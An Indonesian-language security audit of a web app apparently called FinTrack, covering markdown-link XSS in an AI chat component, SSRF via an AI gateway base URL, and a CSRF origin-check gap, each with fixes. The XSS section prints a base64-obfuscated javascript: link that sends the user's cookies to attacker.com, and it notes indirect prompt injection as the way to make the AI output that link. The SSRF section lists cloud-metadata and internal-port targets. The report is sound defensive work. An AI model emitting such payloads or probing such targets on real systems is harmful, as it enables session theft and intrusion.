# Temuan Keamanan: XSS pada Markdown, SSRF pada AI Gateway, dan Celah CSRF

**Kode Dokumen**: AUDIT-SEC-01  
**Klasifikasi**: Keamanan Aplikasi Web & API (Application Security)  

---

## 1. Temuan SEC-01: Cross-Site Scripting (XSS) via Unsanitized Anchor Tag di ReactMarkdown

### 1.1 Lokasi Sumber Masalah
- **Berkas**: `frontend/components/ai/ChatMessage.tsx`
- **Baris**: 109–111

```tsx
// frontend/components/ai/ChatMessage.tsx:109-111
a: ({ children, href, node, ...props }: React.ComponentPropsWithoutRef<"a"> & { node?: unknown }) => (
  <a href={href} className="cursor-pointer underline text-primary hover:text-primary/80 font-bold" target="_blank" rel="noopener noreferrer" {...props}>{children}</a>
),
```

### 1.2 Analisis Celah & Vektor Serangan
Komponen `ReactMarkdown` menggunakan kustomisasi komponen `a` (anchor) untuk merender tautan. Properti `href` langsung diteruskan ke elemen native `<a>` tanpa memvalidasi skema URI (protokol).

Jika model AI menghasilkan tautan dengan protokol `javascript:` atau `data:text/html;base64,...`, baik karena halusinasi maupun akibat serangan **Indirect Prompt Injection** (misal instruksi tersembunyi pada deskripsi transaksi atau prompt pengguna), browser akan mengeksekusi kode JavaScript berbahaya saat pengguna mengklik tautan tersebut:

```markdown
[Klik di sini untuk klaim bonus](javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsP2M9Iitkb2N1bWVudC5jb29raWU=')))
```

Karena tautan dirender di dalam DOM aplikasi Next.js pengguna, skrip tersebut dapat membaca LocalStorage, memanipulasi form, atau memicu tindakan administratif.

### 1.3 Dampak (Impact)
- **Tingkat Keparahan**: **HIGH (CVSS: 7.4)**
- **Dampak**: Session hijacking, pembajakan token autentikasi di memori, impersonasi pengguna di dasbor FinTrack.

### 1.4 Solusi & Rekomendasi Teknis
Terapkan fungsi sanitasi skema URL yang hanya mengizinkan protokol aman (`http:`, `https:`, dan `mailto:`). Tautan dengan protokol selain itu harus dinonaktifkan (`href="#"` atau diblokir).

```tsx
// Solusi: Sanitasi skema URL sebelum render
function isSafeUrl(url?: string): boolean {
  if (!url) return false;
  try {
    const parsed = new URL(url, "https://fintrack.internal");
    return parsed.protocol === "http:" || parsed.protocol === "https:" || parsed.protocol === "mailto:";
  } catch {
    return false;
  }
}

// Pada ChatMessage.tsx:
a: ({ children, href, node, ...props }: React.ComponentPropsWithoutRef<"a"> & { node?: unknown }) => {
  const safeHref = isSafeUrl(href) ? href : "#";
  return (
    <a
      href={safeHref}
      className="cursor-pointer underline text-primary hover:text-primary/80 font-bold"
      target="_blank"
      rel="noopener noreferrer"
      {...props}
    >
      {children}
    </a>
  );
}
```

---

## 2. Temuan SEC-02: Server-Side Request Forgery (SSRF) pada AI Gateway BaseURL

### 2.1 Lokasi Sumber Masalah
- **Berkas**: `backend/internal/admin/aigateway.go`
- **Baris**: 85–90

```go
// backend/internal/admin/aigateway.go:85-90
req.Name = strings.TrimSpace(req.Name)
req.BaseURL = strings.TrimSpace(req.BaseURL)
if req.Name == "" || req.BaseURL == "" {
    response.BadRequest(c, "name dan base_url wajib diisi", "validation")
    return
}
```

### 2.2 Analisis Celah & Vektor Serangan
Saat Super Admin mendaftarkan endpoint AI Gateway baru melalui `POST /api/v1/admin/ai-gateway/endpoints`, kolom `BaseURL` hanya diperiksa apakah string kosong atau tidak. Tidak ada validasi terhadap:
1. **Skema URL**: Penyerang dengan akses Super Admin atau penyerang yang berhasil mencuri JWT admin dapat memasukkan skema selain HTTP/HTTPS (`gopher://`, `file://`, `dict://`).
2. **Private IP & Cloud Metadata**: URL dapat diarahkan ke alamat loopback internal atau link-local metadata cloud:
   - AWS / GCP Metadata: `http://169.254.169.254/latest/meta-data/`
   - Internal Redis Port: `http://127.0.0.1:6379/`
   - Internal PostgreSQL Port: `http://127.0.0.1:5432/`
   - Internal Docker Daemon: `http://127.0.0.1:2375/`

Ketika health checker AI Gateway atau panggilan inferensi mengeksekusi HTTP GET/POST ke `BaseURL`, backend Go akan membuat koneksi jaringan internal dari dalam container.

### 2.3 Dampak (Impact)
- **Tingkat Keparahan**: **HIGH (CVSS: 7.2)**
- **Dampak**: Kebocoran kredensial cloud IAM role dari instance metadata, pembacaan port internal, dan potensi eksploitasi service internal di jaringan Docker cluster.

### 2.4 Solusi & Rekomendasi Teknis
Buat validator URL khusus `ValidateEndpointURL(rawURL string, allowLocalhost bool)`:
1. Parse URL menggunakan `net/url.Parse`. Wajib memiliki scheme `http` atau `https`.
2. Resolusi DNS hostname menggunakan `net.LookupIP`.
3. Tolak jika IP hasil resolusi berada pada rentang:
   - Loopback (`127.0.0.0/8`, `::1`) kecuali jika environment secara eksplisit mengaktifkan flag pengembangan lokal.
   - Link-local / Cloud Metadata (`169.254.0.0/16`).
   - Private networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) pada deployment produksi.

```go
func ValidateEndpointURL(rawURL string, isProduction bool) error {
    u, err := url.ParseRequestURI(rawURL)
    if err != nil {
        return fmt.Errorf("URL tidak valid: %w", err)
    }
    if u.Scheme != "http" && u.Scheme != "https" {
        return errors.New("hanya skema http dan https yang diizinkan")
    }

    host := u.Hostname()
    ips, err := net.LookupIP(host)
    if err != nil {
        return fmt.Errorf("resolusi host gagal: %w", err)
    }

    for _, ip := range ips {
        if ip.IsLoopback() && isProduction {
            return errors.New("alamat localhost/loopback dilarang di lingkungan produksi")
        }
        if ip.IsLinkLocalUnicast() || ip.Equal(net.ParseIP("169.254.169.254")) {
            return errors.New("alamat cloud metadata dilarang")
        }
    }
    return nil
}
```

---

## 3. Temuan SEC-04: Potensi CSRF Bypassing pada Permintaan Berbasis Cookie Tanpa Origin

### 3.1 Lokasi Sumber Masalah
- **Berkas**: `backend/internal/delivery/http/middleware/origin_check.go`
- **Baris**: 53–56

```go
// backend/internal/delivery/http/middleware/origin_check.go:53-56
if origin == "" {
    c.Next()
    return
}
```

### 3.2 Analisis Celah & Vektor Serangan
Middleware `OriginCheck` memeriksa apakah header `Origin` atau `Referer` cocok dengan daftar origin frontend yang diizinkan. Namun, terdapat pengecualian: jika `origin == ""` (kedua header tidak dikirim), middleware langsung memanggil `c.Next()` dan mengizinkan request lolos.

**Skenario Serangan**:
Meskipun cookie FinTrack menggunakan `SameSite: Lax`, beberapa browser legacy atau situasi tertentu (misalnya navigasi tingkat atas via form POST dari domain pihak ketiga yang menyetel header `<meta name="referrer" content="no-referrer">`) menyebabkan browser tidak menyertakan header `Referer`. Jika browser dalam kondisi tertentu tetap menyertakan cookie `ft_at`, request mutasi (`POST /api/v1/transactions`, `DELETE /api/v1/transactions/:id`) dapat tereksekusi tanpa validasi origin.

### 3.3 Dampak (Impact)
- **Tingkat Keparahan**: **LOW-MEDIUM (CVSS: 4.3)**
- **Dampak**: Mutasi data keuangan tanpa disadari oleh pengguna jika mengunjungi situs berbahaya.

### 3.4 Solusi & Rekomendasi Teknis
1. Jika request membawa cookie autentikasi (`ft_at`), **wajibkan** keberadaan header `Origin` atau `Referer` pada metode mutasi (`POST`, `PUT`, `PATCH`, `DELETE`).
2. Tambahkan validasi custom header `X-Requested-With: XMLHttpRequest` atau anti-CSRF token pada seluruh mutasi API yang diinisiasi oleh frontend Next.js.
